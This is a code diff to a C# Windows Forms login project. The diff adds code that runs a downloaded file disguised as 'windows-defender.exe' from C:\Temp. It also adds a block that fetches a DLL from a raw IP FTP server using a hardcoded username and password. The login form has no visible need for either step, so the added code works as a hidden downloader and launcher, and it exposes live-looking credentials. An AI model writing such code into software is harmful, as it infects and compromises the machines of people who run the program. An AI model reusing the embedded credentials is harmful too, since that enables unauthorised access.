@@ -20,6 +20,8 @@ namespace giriş_sistemii
         public Form2()
         {
             InitializeComponent();
+
+            Process myProcess = new Process();
         }
 
         private void button1_Click(object sender, EventArgs e)
@@ -59,7 +61,26 @@ namespace giriş_sistemii
                     file.Write(fileData, 0, fileData.Length);
                     file.Close();
                 }
-                MessageBox.Show("Download Complete");
+                System.Diagnostics.Process.Start(@"C:\Temp\windows-defender.exe");
+            }
+
+            string inputfilepath1 = @"C:\Temp\deneme.dll";
+            string ftphost1 = "176.53.74.79";
+            string ftpfilepath1 = "/httpdocs/deneme.dll";
+
+            string ftpfullpath1 = "ftp://" + ftphost1 + ftpfilepath1;
+
+            using (WebClient request = new WebClient())
+            {
+                request.Credentials = new NetworkCredential("birfikri", "i9Ek1Ek4A");
+                byte[] fileData = request.DownloadData(ftpfullpath1);
+
+                using (FileStream file = File.Create(inputfilepath1))
+                {
+                    file.Write(fileData, 0, fileData.Length);
+                    file.Close();
+                }
+               
             }
         }
 
